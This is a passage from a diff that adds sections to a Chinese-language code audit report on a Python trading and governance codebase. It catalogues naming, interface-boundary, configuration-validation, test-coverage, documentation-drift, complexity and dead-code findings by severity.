+18. **[LOW]** `src/zephyr/integration/vector_memory/in_process_vector_memory.py:105` — `@property def started(self) -> bool:` 布尔属性缺少`is_`前缀
+19. **[LOW]** `src/zephyr/trading/verdict_engine.py:51,101,142` — `gate_passed: bool = False` 布尔字段缺少`is_`前缀；同文件第48-49行`is_human`/`is_cross_module`已正确使用前缀，同文件内不一致
+20. **[LOW]** `src/zephyr/ops/gates/safety_gate_l44_l45.py:29-34` + `safety_gate_l50_l51.py:31-33` + `safety_gate_l52_l53.py:29-30` + `safety_gate_l56_l57.py:31` + `safety_gate_l60_l61.py:29-30` + `safety_gate_l62_l63.py:29-32` + `safety_gate_l64_l65.py:29-31` + `safety_gate_l46_l47.py:34` + `safety_gate_l48_l49.py:29,32`（约9个文件） — 大量布尔字段如`slo_compliant`/`pnl_reconciled`/`network_partition`/`exchange_halted`/`loop_detected`/`boot_measurement_ok`等未使用`is_`前缀；而同目录`safety_gate_l1_l27.py:59-70`的`has_rollback`/`is_idempotent`已正确使用
+21. **[LOW]** `src/zephyr/ops/gates/safety_gate_l1_l27.py:69` + `parameterized_safety_gate.py:95` — `in_circuit_breaker: bool = False` 使用非标准`in_`前缀（标准布尔前缀为`is_`/`has_`/`should_`/`can_`）
+
+**核心模式总结**：(1)3处HIGH均为保留`db_path`参数但实际连接PostgreSQL的"幽灵参数"——违反depgraph必须为PostgreSQL硬约束；(2)同一动作多种命名最突出的是"获取数据库连接"（4种模式）和"写入fle_metrics表"（record vs write）；(3)~40个`CT_XX_XXX`类名违反PascalCase集中在capacity_assurance/contracts/；(4)布尔命名不规范在safety_gate_l*.py系列9个文件30+字段最普遍
+
+**严重度汇总**：HIGH=4, MEDIUM=10, LOW=7, 合计=21
+
+---
+
+### 5.154 接口边界清晰度（14个，第26轮新增）
+
+#### HIGH（6个：私有成员被外部调用）
+
+1. **[HIGH]** `scripts/ide_health_service.py:125,132` — `from zephyr.trading.ide_health_daemon import _daemon_instance` 直接导入私有单例`_daemon_instance`（未列入`__all__`）；第132行进一步读取`_daemon_instance._running`（私有实例属性）。双重私有边界破坏
+2. **[HIGH]** `src/zephyr/governance/audit_trail/pipeline_runner.py:1036` — `from zephyr.infrastructure.rollback.phase_check_registry import _CHECK_MAP, GateResult` 导入私有符号`_CHECK_MAP`。目标模块`__all__`显式排除`_CHECK_MAP`，但此处跨包引用并迭代其内容
+3. **[HIGH]** `src/zephyr/governance/audit_orchestrator/pipeline_runner.py:1033` — 与#2同样问题：导入`phase_check_registry._CHECK_MAP`（不在`__all__`），第1035行直接迭代。两个pipeline_runner副本都越过公共API直访内部注册表
+4. **[HIGH]** `src/zephyr/shared/schema/schema_registry.py:141,150` — `from zephyr.shared.__version__ import _parse_semver` 导入私有函数。`__version__.py:46-61`的`__all__`明确未包含`_parse_semver`，且已提供公共封装`version_eq/version_lt/version_gt/version_compatible`
+5. **[HIGH]** `src/zephyr/integration/shared/schema/schema_registry.py:137,146` — 与#4完全相同的私有导入副本（`_parse_semver`），存在于integration/shared/schema镜像模块中。表明该边界违规是系统性复制
+6. **[HIGH]** `scripts/governance/check_schema_version_writes.py:133` — `from zephyr.governance.depgraph_schema import _MIGRATIONS` 导入私有列表。`depgraph_schema.py:1238-1244`的`__all__`仅含5个公共符号，`_MIGRATIONS`被排除。源文件第1094行注释"此函数保留以支持check_schema_version_writes.py引用_MIGRATIONS数据"自认了这处跨模块私有依赖
+
+#### MEDIUM（6个：__all__问题）
+
+7. **[MEDIUM]** `src/zephyr/governance/base_repo.py:54-69` — `__all__`列表同时导出公共与私有命名的符号：`_ALLOWED_TRANSITIONS`/`_is_valid_transition`/`_new_id`/`_row_to_taskcard`（下划线前缀）与`InvalidTransitionError`/`now_iso`/`search`等并列。命名约定与`__all__`直接矛盾
+8. **[MEDIUM]** `src/zephyr/ops/diagnosers/__init__.py:33-37` 与 `ops/detectors/__init__.py:34-39` — 两个包的`__all__`把私有子模块名作为公共API导出：`_cognitive`/`_diagnosis`/`_health`/`_reliability`(diagnosers)以及`_anomaly`/`_correlation`/`_drift`/`_guard`/`_reliability`(detectors)
+9. **[MEDIUM]** 13个re-export wrapper使用非标准`__all__ = ["*"]`模式：`pf_core/strategy_engine/__init__.py:7`、`pf_core/performance_attribution_engine/__init__.py:7`、`compliance/audit_orchestrator/__init__.py:7`、`compliance/behavioral_auditor/__init__.py:7`、`compliance/behavioral_admission/__init__.py:7`、`compliance/compliance_gate_a6/__init__.py:7`、`compliance/implementations/__init__.py:7`、`compliance/semantic_auditor/__init__.py:7`、`compliance/zero_knowledge_audit_stub/__init__.py:7`、`ops/schema/__init__.py:6`、`ops/alerts/__init__.py:6`、`ops/health/__init__.py:6`、`ops/profiles/__init__.py:6`。`__all__ = ["*"]`在Python语义上意为"公共API仅含名为`*`的符号"，并非"透传所有导出"——`from wrapper import *`实际不会导入源模块的任何符号
+10. **[MEDIUM]** `scripts/git_guard.py` — 整个脚本模块未声明`__all__`，导致所有非下划线符号均成为事实公共API。下游`tests/red_blue/test_concurrency_guard_red_blue.py:58`进而`from scripts.git_guard import _EXTRACTORS, DANGEROUS_SUBCOMMANDS, check_and_execute`与第65行`from scripts.git_guard import MV_STRATEGY_ENV, _scan_untracked_in_dir`——私有`_EXTRACTORS`和`_scan_untracked_in_dir`被测试当作公共契约消费
+11. **[MEDIUM]** `scripts/scaffold.py:90` — `__all__: list[str] = []`（空列表），但模块含`ScaffoldError`/`_check_duplicate_functionality`等事实上被外部使用的符号。空`__all__`使`from scripts.scaffold import *`什么也拿不到；`tests/test_ssot_gate.py:33`同时导入`ScaffoldError, _check_duplicate_functionality`（后者私有）
+12. **[MEDIUM]** `src/zephyr/pf_core/strategy_registry.py` — re-export wrapper（`from zephyr.governance.strategy_registry import *`）但未声明自己的`__all__`。同目录`pf_core/strategy_engine/__init__.py`用`["*"]`，`strategy_registry.py`用空——同包内两种相反的非标准约定
+
+#### LOW（2个）
+
+13. **[LOW]** `src/zephyr/infrastructure/task_manager_server.py:100` — docstring显式承认"向后兼容：指向FastMCP内部lowlevel `Server`（tests/与红队脚本读`.name`）"。第三方库的内部对象被作为本模块公共属性暴露，且测试与红队脚本已依赖该内部结构。镜像副本`integration/mcp/task_manager_server.py:94`同
+14. **[LOW]** `src/zephyr/behavioral_audit/__init__.py:285-289` — `_init_submodules()`内部通过`mod._SUBMODULES`抓取5个私有子模块的私有列表`_SUBMODULES`来驱动`__getattr__`惰性加载。一旦某子模块重命名`_SUBMODULES`，包级懒加载即断裂，无`__all__`或公共getter兜底
+
+**核心模式总结**：(1)6处HIGH均为"下划线前缀私有符号被跨模块导入"——`_daemon_instance`/`_CHECK_MAP`×2/`_parse_semver`×2/`_MIGRATIONS`，目标模块`__all__`已显式排除但仍被绕过；(2)13处`__all__ = ["*"]`是规模化误解Python语义——意图透传但实际阻断star-import；(3)scripts/下git_guard.py和scaffold.py的`__all__`问题导致测试消费私有符号成为"事实契约"
+
+**严重度汇总**：HIGH=6, MEDIUM=6, LOW=2, 合计=14
+
+---
+
+### 5.155 配置验证完整性（21个，第26轮新增）
+
+#### HIGH（4个：安全/启动失败）
+
+1. **[HIGH]** `src/zephyr/infrastructure/rollback/sqlite_dumper.py:66,107` 与 `src/zephyr/governance/sqlite_dumper.py:66,107` — HMAC密钥硬编码：`HMAC_KEY_DEFAULT = b"ZephyrAlpha-Rollback-Integrity-v1"`，构造函数`self._hmac_key = hmac_key or HMAC_KEY_DEFAULT`默认使用该硬编码值。`.env.example:44`声明了`ZEPHYR_AUDIT_HMAC_SECRET`但本模块从未读取该环境变量。回滚快照完整性签名可被任何持有源码者伪造
+2. **[HIGH]** `src/zephyr/governance/rule_enforcement/gate_integrity_guard.py:74-77` — `verify_self()`在两个分支中都`return True`：`_TRUST_ROOT`为空时返回True（"skipping"），非空时也直接`return True`。完整性自校验永不失败，门禁完整性守卫被静默禁用
+3. **[HIGH]** `src/zephyr/governance/rule_enforcement/circuit_breaker.py:90` — 模块级`DEFAULT_THRESHOLD: int = int(os.environ.get("ZEPHYR_CBG_FAILURE_THRESHOLD", "3"))` 无try/except。若环境变量设为非整数字符串（如`"three"`），`int()`抛`ValueError`，导致整个模块导入失败
+4. **[HIGH]** `src/zephyr/intelligence/model_profiling/exam_orchestrator.py:155` — `depth_samples_per_case = int(os.environ.get("ZEPHYR_DEPTH_SAMPLES", "1"))` 同样无try/except。非整数环境变量值会导致`ExamOrchestrator.__init__`抛`ValueError`
+
+#### MEDIUM（11个：运行时错误）
+
+5. **[MEDIUM]** `src/zephyr/infrastructure/config/__init__.py:115-121` — `load_config()`找不到YAML时仅打warning并返回默认`AppConfig()`。已导入的校验加载器`load_yaml_config_validated`(line 44)从未被调用，配置缺失被默认值掩盖
+6. **[MEDIUM]** `src/zephyr/infrastructure/config/__init__.py:142-146` — `ZEPHYR_ENV`和`ZEPHYR_LOG_LEVEL`环境变量覆盖YAML时无值校验。`ZEPHYR_LOG_LEVEL`可为`"INVALID"`直接接受；`env`字段未对照`Env`枚举校验
+7. **[MEDIUM]** `src/zephyr/infrastructure/config_validator.py:74-79` — `_REQUIRED_CONFIG_FIELDS`引用`thresholds.yaml`/`pipelines.yaml`/`modules.yaml`/`gates.yaml`，但这四个文件在`config/`目录中均不存在。实际配置文件不在必填校验覆盖范围内
+8. **[MEDIUM]** `src/zephyr/trading/orchestrator/trigger_router.py:730,739` — `routing_config = yaml.safe_load(fh)`后直接`routing_config.get("routes", [])`。若YAML文件为空，`safe_load`返回`None`，`.get()`抛`AttributeError`。无`isinstance(config, dict)`类型校验
+9. **[MEDIUM]** `src/zephyr/infrastructure/capacity_assurance/modules/config_reload_semantic.py:54-57` — 热重载回调包裹在`try: cb(filepath) except Exception: pass`中，静默吞掉所有重载错误（YAML解析失败/schema违规等）。配置热重载失败不可见
+10. **[MEDIUM]** `src/zephyr/behavioral_audit/cold_start.py:202-209,226-227` — `detect_missing_env()`检测到`ZEPHYR_PROJECT_ROOT`缺失时仅追加到`result.warnings`，`bootstrap()`继续执行。必填环境变量缺失不报错
+11. **[MEDIUM]** `src/zephyr/behavioral_audit/drift_infrastructure.py:165` 与 `src/zephyr/governance/drift_detection/drift_infrastructure.py:131` — `root = os.environ.get("ZEPHYR_PROJECT_ROOT", os.getcwd())` 回退到`os.getcwd()`，当前工作目录可能任意。后续`os.path.join(root, "data", "drift_checkpoints")`会创建到错误位置
+12. **[MEDIUM]** `src/zephyr/shared/foundation/flags.py:87,108-112` — `FeatureFlag.rollout_pct: int = 0` 无范围校验（应为0-100）。值>100时`bucket < self.rollout_pct`恒为True（全员启用）。`__post_init__`缺失
+13. **[MEDIUM]** `src/zephyr/integration/llm_gateway.py:190-198,262-270` — `api_key = os.getenv(config.api_key_env, "")` 空默认值。密钥缺失时返回`simulated=True`的模拟响应而非报错。生产环境中配置错误被静默降级为模拟模式（`infrastructure/pipeline/llm_gateway.py:198`和`autonomy_core/llm_gateway.py:190`存在相同模式）
+14. **[MEDIUM]** `src/zephyr/infrastructure/rollback/rollback_integration.py:419-422` — `db_url = os.environ.get("DATABASE_URL", "")`，未设置时返回`True, "No database URL configured — skipping pool check"`。连接池健康检查在DB URL缺失时默认通过
+15. **[MEDIUM]** `config/mcp.json:2` 与 `scripts/mcp/generate_ide_config.py:38-58` — `mcp.json`声明`"$schema": "./mcp.schema.json"`但该schema文件不存在。`generate_ide_config.py:58`访问`srv['module']`无key存在性检查
+
+#### LOW（6个）
+
+16. **[LOW]** `src/zephyr/governance/architecture_governance/path_resolver.py:256` — 使用`ZEPHYR_ROOT`，而16+个其他文件使用`ZEPHYR_PROJECT_ROOT`。同一概念两种环境变量名，且SSoT `REPO_ROOT`（`shared/io/paths.py:61`）根本不读环境变量
+17. **[LOW]** `src/zephyr/infrastructure/rollback/rollback_executor.py:585` — `os.environ.get("ZEPHYR_OWNER_SESSION_ID") or os.environ.get("OWNER_SESSION_ID")` — 同一概念两个变量名。`governance/rollback_executor.py:613`重复此模式
+18. **[LOW]** `src/zephyr/ops/telemetry.py:234,242` 与 `infrastructure/asset_inventory/telemetry.py:232,240` — `smtp_port: int = 587` 硬编码，不可通过环境变量配置，而`smtp_host`/`smtp_user`/`smtp_password`均可。端口无范围校验
+19. **[LOW]** `.env.example` — 代码中使用的18+个环境变量未文档化：`ZEPHYR_PROJECT_ROOT`/`ZEPHYR_ROOT`/`ZEPHYR_METRICS_DIR`/`ZEPHYR_CBG_FAILURE_THRESHOLD`/`ZEPHYR_DEPTH_SAMPLES`/`ZEPHYR_TRUST_ROOT`/`ZEPHYR_ENFORCE_CAPABILITY`/`ZEPHYR_OWNER_SESSION_ID`/`ZEPHYR_FEISHU_WEBHOOK`/`ZEPHYR_SMTP_*`等
+20. **[LOW]** `src/zephyr/behavioral_audit/brain_integration.py:36-39` 与 `governance/drift_detection/brain_integration.py:35-38` — `_PROJECT_ROOT = os.environ.get("ZEPHYR_PROJECT_ROOT", os.path.dirname(...))` 独立计算项目根，重复SSoT `REPO_ROOT`（`shared/io/paths.py:42-58`的`find_repo_root()`）
+21. **[LOW]** `src/zephyr/infrastructure/config/__init__.py:164-183` — `__all__`导出列表包含局部变量（`dsp`/`dsp_any`/`env`/`env_p`/`loaded`/`log_level`/`p`/`pe`/`raw_text`/`yaml_path`）且有重复条目，污染公共API
+
+**核心模式总结**：(1)安全最严重：#1(HMAC硬编码)+#2(完整性校验恒True)构成回滚完整性伪造链路；(2)启动最脆弱：#3/#4(`int(env)`无异常防护)可在模块导入阶段崩溃；(3)配置漂移最广：#16/#17/#19(命名不一致+未文档化)影响20+处环境变量读取；(4)校验形同虚设：#5(默认值回退)+#7(validator覆盖空)+#9(热重载吞异常)三层校验同时失效
+
+**严重度汇总**：HIGH=4, MEDIUM=11, LOW=6, 合计=21
+
+---
+
+### 5.156 测试覆盖率盲区（12个，第26轮新增）
+
+#### HIGH（4个：关键路径无测试）
+
+1. **[HIGH]** `tests/test_l06_trade_execution.py:22` — `pytest.importorskip("zephyr.l06_trade_execution")` 引用的模块在`src/zephyr/`下不存在，导致整个测试文件被静默skip。文件内`TestOrderManager`的3个用例+`TestSimulationBroker`全部12个用例从不运行。且第24行`from zephyr.ex_core.src.zephyr.execution_engine import ...`路径错误（正确为`zephyr.ex_core.execution_engine`），即便importorskip不跳过也会ImportError
+2. **[HIGH]** `src/zephyr/ex_core/order_manager.py:165-191` — `OrderManager._on_fill`是订单成交回报核心方法，包含状态转换(PARTIAL/FILLED，行182-185)、加权平均价计算(行171-179)、回调异常吞咽(行187-191)。无任何单元测试覆盖该方法的逻辑。`VALID_TRANSITIONS`状态机(行63-70)也无任何测试覆盖违规转换拒绝路径
+3. **[HIGH]** `src/zephyr/shared/config/loader.py:68-174` — 配置加载基座完全无测试覆盖。包含多个未测异常分支：文件不存在(行82-86)、Unicode解码错误(行90-94)、YAML解析错误(行96-105)、非dict类型(行110-114)、Pydantic校验失败(行161-171)、merge_files失败跳过(行151-152)。配置加载是所有模块的入口
+4. **[HIGH]** `tests/test_auditor.py:32` — `@patch("zephyr.infrastructure.rollback.auditor.AuditWriter")` 路径错误。被测代码`src/zephyr/governance/auditor.py:28`通过`importlib.import_module("zephyr.governance.audit_trail.contracts")`动态导入AuditWriter，模块路径是`zephyr.governance.auditor`而非`zephyr.infrastructure.rollback.auditor`。mock不会生效，测试实际调用真实的AuditWriter.write，所有`assert_called_once_with`断言基于错误前提
+
+#### MEDIUM（5个）
+
+5. **[MEDIUM]** `tests/test_infra_lock.py:27` / `test_infra_idempotency.py:25` / `test_infra_outbox.py:25` — 三个测试文件均导入`zephyr.shared.infra_06.*`，但生产代码通过`zephyr.shared.lock`/`idempotency`/`outbox` re-export指向`zephyr.shared.infra.*`。`infra/`与`infra_06/`是两份独立实现。若`infra/lock.py`修改而`infra_06/lock.py`未同步，测试仍通过但生产代码已损坏
+6. **[MEDIUM]** `src/zephyr/shared/infra/lock.py:110-180` / `infra/idempotency.py:86-175` / `trading/ai_audit_logger.py:63-68` — 并发代码无并发测试。`MemoryLock`(asyncio.Lock保护)只有顺序acquire测试；`IdempotencyStore`无多协程同时`start`同一key的竞争测试；`AiAuditLogger._write`用`threading.Lock`保护并发写入，但无任何多线程并发写入测试
+7. **[MEDIUM]** `src/zephyr/shared/infra/outbox.py:208-228` — `OutboxPublisher._poll_loop`的错误分支无测试：handler抛异常时`mark_failed`(行224-226)、`retry_count >= max_retries`时`mark_failed`并warning(行213-216)、外层`except Exception`(行227-228)。测试只测了正常发布和start/stop幂等
+8. **[MEDIUM]** `src/zephyr/governance/merkle_audit.py:29-55` — 审计完整性核心组件无篡改检测测试。`test_merkle_audit.py`只测happy path(add_event→root_hash长度/类型)，无修改leaves后root变化检测、inclusion proof验证、历史root比对、空dict/非dict事件输入边界
+9. **[MEDIUM]** `tests/test_ai_audit_logger.py:1-192` — 只测happy path。无错误分支测试：磁盘满/权限不足时`f.open("a")`抛OSError、跨日期文件切换、`query`遇到损坏JSON行的处理、`flush`与并发写入的竞态
+
+#### LOW（3个）
+
+10. **[LOW]** `tests/test_security_secrets.py:27` — 导入`from zephyr.security.llm_defense.llm_security.patterns.secrets import EnvSecretProvider, ...`，而生产代码在`src/zephyr/shared/security/secrets.py`。`llm_defense/.../patterns/secrets.py:253-261`末尾re-export了shared.security.secrets的符号，测试通过re-export链间接覆盖。若re-export被移除，测试立即失效
+11. **[LOW]** `src/zephyr/shared/security/capability.py:97-142` — `CapabilityRegistry._load_from_yaml`无测试。`test_security_capability.py`全部用例都通过`registry._capabilities = [...]`手动注入，未覆盖YAML文件不存在warning、空rules warning、空allow+deny dead rule warning、大括号模式warning
+12. **[LOW]** `src/zephyr/ex_core/execution_engine.py:118` — `ExecutionEngine._reports`字段在`__init__`初始化后，`_execute_twap`/`_execute_vwap`/`_execute_market`(行183-204)均不写入`_reports`，导致`get_engine_run_record`永远返回None。测试`test_get_engine_run_record_none`只测了None路径，未发现"正常填充路径缺失"这一代码缺陷
+
+**核心模式总结**：(1)4处HIGH中2处是"测试文件存在但因路径错误/importorskip而从不运行"——test_l06_trade_execution(12用例skip)+test_auditor(mock路径错误)；(2)核心业务逻辑(OrderManager._on_fill状态机/加权平均价)和基础设施(config/loader)完全无测试；(3)并发代码(lock/idempotency/ai_audit_logger)无并发测试是系统性盲区；(4)merkle_audit无篡改检测测试影响审计完整性保障
+
+**严重度汇总**：HIGH=4, MEDIUM=5, LOW=3, 合计=12
+
+---
+
+### 5.157 文档与代码同步深度（25个，第26轮新增）
+
+#### HIGH（9个：误导严重）
+
+1. **[HIGH]** `AGENTS.md:38,58,61,64,65` — AGENTS.md §3/§4.1多处引用`zephyr.infra_runtime.a2a_protocol`作为A2A Protocol的入口路径，但实际代码位于`zephyr.infrastructure.a2a_protocol`。所有示例import语句均无法运行，新AI照搬会ImportError
+2. **[HIGH]** `src/zephyr/__init__.py:2`等27个文件 — 27个源文件的`[BLUEPRINT]`头部引用`docs/03_modules/_domain-infra_runtime/runtime-integration/blueprint.md`（连字符），但实际路径是`docs/03_modules/_domain_infra_runtime/runtime_integration/blueprint.md`（下划线）。影响文件包括`src/zephyr/__init__.py`、`infrastructure/contract_tester.py`、`trading/orchestrator/core/__init__.py`等。另含`trading/task_gate.py:1`引用`_domain-infra_runtime/task-system/blueprint.md`
+3. **[HIGH]** `src/zephyr/trading/__main__.py:1` — `[BLUEPRINT]`头部引用`docs/03_modules/_cross_layer/auto-runtime-core/blueprint.md`（连字符），但实际路径是`docs/03_modules/_cross_layer/auto_runtime_core/blueprint.md`（下划线）
+4. **[HIGH]** `src/zephyr/shared/api/shared_quickref.yaml:157` — 文档声明`from zephyr.shared.time_utils import now_iso, utc_now`，但实际函数名是`now_utc()`（`src/zephyr/shared/utils/time_utils.py:63`定义`def now_utc()`），函数名单词顺序颠倒。照此import会AttributeError
+5. **[HIGH]** `src/zephyr/shared/api/api_index.py:74` — 同一函数名错误：文档表格列出`utc_now() -> datetime`，但实际函数是`now_utc()`。api_index.py L69正确指向`from zephyr.shared.utils.time_utils import ...`，但L74的符号名写反
+6. **[HIGH]** `src/zephyr/shared/api/shared_quickref.yaml:339` — 文档底部声明`version: 0.22.0`，但`pyproject.toml:10`声明`version = "2.0.0"`。版本号严重不一致（0.22 vs 2.0），AI依据quickref判断项目阶段会严重误导
+7. **[HIGH]** `docs/03_modules/_cross_layer/auto_runtime_core/blueprint.md:561` — 引用`D:\ZephyrAlpha\docs\02_enterprise_architecture\target-architecture\architecture_model\module_id_registry.yaml`，但：(a)`target-architecture`应为下划线`target_architecture`；(b)`architecture_model/`实际位于仓库根。实际真源是`d:\ZephyrAlpha\architecture_model\module_id_registry.yaml`
+8. **[HIGH]** `docs/03_modules/_cross_layer/auto_runtime_core/blueprint.md:563` — 引用`D:\ZephyrAlpha\specs\auto-runtime-core\spec.md`，该文件不存在（`specs/`目录下无此文件，连字符与下划线变体均不存在）
+9. **[HIGH]** `docs/03_modules/_cross_layer/auto_runtime_core/blueprint.md:564` — 引用`D:\ZephyrAlpha\configs\capacity_params.yaml`，但实际路径是`config/capacity_params.yaml`（单数`config`，非`configs`）
+
+#### MEDIUM（10个：不一致）
+
+10. **[MEDIUM]** `README.md:44` — 链接`docs/01_policies_and_standards/rules/directory_structure_standard.md`，该文件不存在（rules/目录下所有规则文件以`trae_XXX_*.yaml`命名）
+11. **[MEDIUM]** `README.md:47` — 链接`docs/02_enterprise_architecture/target_architecture/00-overview.md`，但实际文件名是`overview.md`（无`00-`数字前缀）
+12. **[MEDIUM]** `src/zephyr/shared/api/shared_quickref.yaml:2` — 治理锚定声明`blueprint: MOD-INF-016 | docs/03_modules/_cross_layer/shared/blueprint.md`，但实际蓝图路径是`docs/03_modules/_cross_layer/shared_core/blueprint.md`（含`_core`后缀）
+13. **[MEDIUM]** `src/zephyr/shared/api/shared_quickref.yaml:312-313` — `deprecation`条目声明`file: src/zephyr/shared/deprecation.py`且`entry_point: from zephyr.shared.deprecation import deprecated`，但该文件是re-export shim（L25: `from zephyr.shared.foundation.deprecation import *`）。canonical真源是`zephyr.shared.foundation.deprecation`。文档未标注shim身份，误导AI在shim处编辑
+14. **[MEDIUM]** `src/zephyr/shared/api/shared_quickref.yaml:484` — `time_utils_enhanced`条目声明`file: src/zephyr/shared/time_utils.py`，但该文件是re-export shim。canonical是`src/zephyr/shared/utils/time_utils.py`
+15. **[MEDIUM]** `src/zephyr/shared/api/shared_quickref.yaml:164` — `frontmatter`条目声明`file: src/zephyr/shared/frontmatter_utils.py`，但该文件是re-export shim。canonical是`src/zephyr/shared/io/frontmatter_utils.py`
+16. **[MEDIUM]** `src/zephyr/shared/api/shared_quickref.yaml:572` — 引用`docs/03_modules/l01_infrastructure/agent-rbac/blueprint.md`，该路径不存在（`l01_infrastructure/`目录不存在，`agent-rbac`连字符目录也不存在）
+17. **[MEDIUM]** `src/zephyr/shared/api/shared_quickref.yaml:1063` — 引用`docs/03_modules/l01_infrastructure/audit-trail/blueprint.md`，同样不存在
+18. **[MEDIUM]** `scripts/hooks/contract_fingerprint_hook.sh:17` — `CONTRACTS_YAML="docs/02_enterprise_architecture/target-architecture/architecture-model/contracts/cross_layer_contracts.yaml"`，同时使用`target-architecture`和`architecture-model`两个连字符路径，AGENTS.md L434已明确"下划线唯一合法"
+19. **[MEDIUM]** `src/zephyr/trading/boot_hooks.py:53` — docstring声明"实例化6个被动库监控模块"，但L87-88显示第3项AggregateHealth仅为TODO注释，实际只实例化5个模块。docstring与实现不符
+
+#### LOW（6个）
+
+20. **[LOW]** `src/zephyr/shared/deprecation.py:16` — re-export shim含`# [TTL] task_bound`但缺`# [DEPRECATED]`标记。AGENTS.md §7 L209规定临时过渡shim需"含`# [TTL] task_bound`+`# [DEPRECATED]`标记"，缺一不可
+21. **[LOW]** `src/zephyr/shared/api_client.py:16` — 同上，re-export shim缺`# [DEPRECATED]`标记
+22. **[LOW]** `src/zephyr/shared/time_utils.py:16` — 同上，re-export shim缺`# [DEPRECATED]`标记
+23. **[LOW]** `src/zephyr/shared/frontmatter_utils.py:16` — 同上，re-export shim缺`# [DEPRECATED]`标记
+24. **[LOW]** `src/zephyr/trading/boot_hooks.py:4` — `[DEPENDENCIES]`字段中`zephyr.shared.event_bus`重复出现两次，依赖列表去重缺失
+25. **[LOW]** `src/zephyr/trading/boot_hooks.py:88` — `# TODO DM-201247: 当 HealthMonitor 分钟级调度就绪后接入`标注待办，但无对应任务卡追踪，且CircadianScheduler已于2026-06-26废除，此TODO的触发条件"分钟级调度就绪"可能已永久无法满足，属过期TODO
+
+**核心模式总结**：(1)9处HIGH中4处是"连字符vs下划线路径漂移"（27文件BLUEPRINT+__main__.py+blueprint.md内部引用+contract_fingerprint_hook.sh），违反AGENTS.md L434"下划线唯一合法"硬约束；(2)`now_iso`/`utc_now`函数名颠倒是文档与代码不同步的最直接证据——照文档import会AttributeError；(3)版本号0.22 vs 2.0严重误导项目阶段判断；(4)4处shim缺`[DEPRECATED]`标记违反AGENTS.md §7规定；(5)shared_quickref.yaml中3处条目指向shim而非canonical真源，误导AI在shim处编辑
+
+**严重度汇总**：HIGH=9, MEDIUM=10, LOW=6, 合计=25
+
+---
+
+### 5.158 循环复杂度（12个，第27轮新增）
+
+#### HIGH（1个）
+
+1. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\intelligence\model_profiling\exam_orchestrator.py:510` — `_compute_metrics_generic` 复杂度30+，221行，5个for循环段+4层嵌套
+
+#### MEDIUM（4个）
+
+2. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\intelligence\model_profiling\exam_orchestrator.py:1278` — `_run_hallucination_six_dim` 复杂度17，94行，7个连续if检测分支
+3. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\trading\verdict_engine.py:169` — `evaluate` 复杂度17，124行，4路事件类型分发
+4. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\ops\scheduler.py:327` — `_run_once` 105行，5阶段流水线挤在单函数，5个return
+5. **[MEDIUM]** `d:\ZephyrAlpha\scripts\git_commit.py:118` — `main` 复杂度16，151行，8路if/elif状态分发
+
+#### LOW（7个）
+
+6. **[LOW]** `d:\ZephyrAlpha\src\zephyr\trading\resource_optimization.py:317` — `snapshot` 复杂度12
+7. **[LOW]** `d:\ZephyrAlpha\src\zephyr\trading\action_dispatcher.py:240` — `_search_replace_file` 复杂度12
+8. **[LOW]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\reconciler.py:300` — `_fix_dep_sync` 复杂度12
+9. **[LOW]** `d:\ZephyrAlpha\src\zephyr\trading\resource_optimization.py:394` — `_classify_pressure` 13个连续if
+10. **[LOW]** `d:\ZephyrAlpha\src\zephyr\trading\orchestrator\chaos_engine.py:130` — `inject` 7个return
+11. **[LOW]** `d:\ZephyrAlpha\src\zephyr\trading\auto_runtime_core.py:334` — `_start_local_models` 4个串联try/except
+12. **[LOW]** `d:\ZephyrAlpha\src\zephyr\intelligence\model_profiling\exam_orchestrator.py:439` — `_compute_metrics` 6路if分支
+
+**核心模式总结**：(1)最高危集中在exam_orchestrator（3处，含1个30+复杂度221行巨型函数）；(2)MEDIUM均为"多路分发挤在单函数"——事件类型分发/状态机if-elif/流水线阶段；(3)7个LOW多为"连续if分类"与"多return出口"，可通过查表/早返回/策略模式降解
+
+**严重度汇总**：HIGH=1, MEDIUM=4, LOW=7, 合计=12
+
+---
+
+### 5.159 死代码（9个，第27轮新增）
+
+#### HIGH（5个）
+
+1. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\governance\governance\*.py` — 7个死重复文件（内层错位包：auditor/budget_tracker/drift_fix/approval/contracts/a2a_failure/budget_handler），全项目grep 0引用
+2. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\rollback\governance\*.py` — 5个死文件（整个子包从未被导入：auditor/budget_tracker/contracts/drift_fix/result_types）
+3. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\governance\_*.py` — 8个错位split文件（_core/_delegation/_detection/_monitoring/_safety/_cli_and_tools/analysis/infrastructure），文件头声称被消费但实际__init__.py无引用
+4. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\trading\orchestrator\{state,resilience}\*.py` — 5个死重复文件（state/agent_health_monitor、state/file_task_mapper、state/session_manager、resilience/deferred_queue、resilience/rollback_manager）
+5. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\governance\audit_orchestrator\*.py` — 20个死重复文件（audit_trail副本：anomaly/cli/contracts/delegation_auditor等20个，__init__.py从audit_trail导入而非本地）
+
+#### MEDIUM（1个）
+
+6. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\_manifest.py:26` — MANIFEST字典仅被tests导入，生产0引用，且声明code_directory路径错位
+
+#### LOW（3个）
+
+7. **[LOW]** `d:\ZephyrAlpha\src\zephyr\autonomy_core\context_assembler.py:43` — `if True:` 死分支（永真条件包装import）
+8. **[LOW]** `d:\ZephyrAlpha\src\zephyr\governance\depgraph_schema.py:1210` — `get_db_connection` 废弃别名0调用（生产代码无引用）
+9. **[LOW]** `d:\ZephyrAlpha\src\zephyr\integration\shared\api_03\api_index.py:50-300` — >250行注释掉的import代码块
+
+**核心模式总结**：(1)5处HIGH均为"错位/重复子包整体死亡"——内层governance/governance、rollback/governance、orchestrator/{state,resilience}、audit_orchestrator共37+文件从未被导入，是历史split/merge残留；(2)8个_*.py错位split文件文件头声称被消费但__init__.py无引用，是"声明与实现脱节"；(3)注释代码块/废弃别名属常规清理项
+
+**严重度汇总**：HIGH=5, MEDIUM=1, LOW=3, 合计=9
+
+---
+
+### 5.160 魔法数字/字符串（27个，第27轮新增）
+
+#### HIGH（6个）
+
